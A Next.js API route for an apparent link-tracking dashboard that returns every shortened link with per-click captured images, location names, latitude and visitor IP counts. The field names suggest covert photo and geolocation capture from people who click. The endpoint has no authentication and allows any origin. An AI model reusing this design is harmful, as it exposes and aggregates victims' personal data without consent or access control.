import { NextResponse } from 'next/server';
import { supabase } from '../../../../lib/supabase';

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  });
}

export async function GET() {
  try {
    const { data, error } = await supabase
      .from('urls')
      .select(`
        *,
        link_analytics (
          id,
          captured_image,
          location_name,
          latitude
        )
      `)
      .order('created_at', { ascending: false });

    if (error) {
      return NextResponse.json(
        { error: error.message },
        { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    // Fetch Global Total Clicks
    const { count: globalClicksCount } = await supabase
      .from('link_analytics')
      .select('*', { count: 'exact', head: true });

    // Fetch Unique Visitors
    const { data: visitorData } = await supabase
      .from('link_analytics')
      .select('ip_address');

    const uniqueVisitors = visitorData
      ? new Set(visitorData.map((v: any) => v.ip_address).filter(Boolean)).size
      : 0;
    const uniqueAdmins = new Set((data || []).map((l: any) => l.device_id)).size;

    const processedLinks = (data || []).map((link: any) => {
      const analytics = link.link_analytics || [];
      return {
        ...link,
        clicks: analytics.length,
        image_count: analytics.filter((a: any) => a.captured_image).length,
        location_count: analytics.filter((a: any) => a.location_name).length,
        geo_count: analytics.filter((a: any) => a.latitude).length,
      };
    }).sort((a: any, b: any) => {
      if (a.is_pinned && !b.is_pinned) return -1;
      if (!a.is_pinned && b.is_pinned) return 1;
      return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
    });

    const sumClicks = processedLinks.reduce((acc: number, curr: any) => acc + (curr.clicks || 0), 0);

    return NextResponse.json(
      {
        success: true,
        links: processedLinks,
        stats: {
          totalLinks: processedLinks.length,
          totalClicks: globalClicksCount || sumClicks,
          totalAdmins: uniqueAdmins,
          totalVisitors: uniqueVisitors || 0,
        },
      },
      { headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  } catch (err: any) {
    return NextResponse.json(
      { error: err?.message || 'Internal Server Error' },
      { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
}
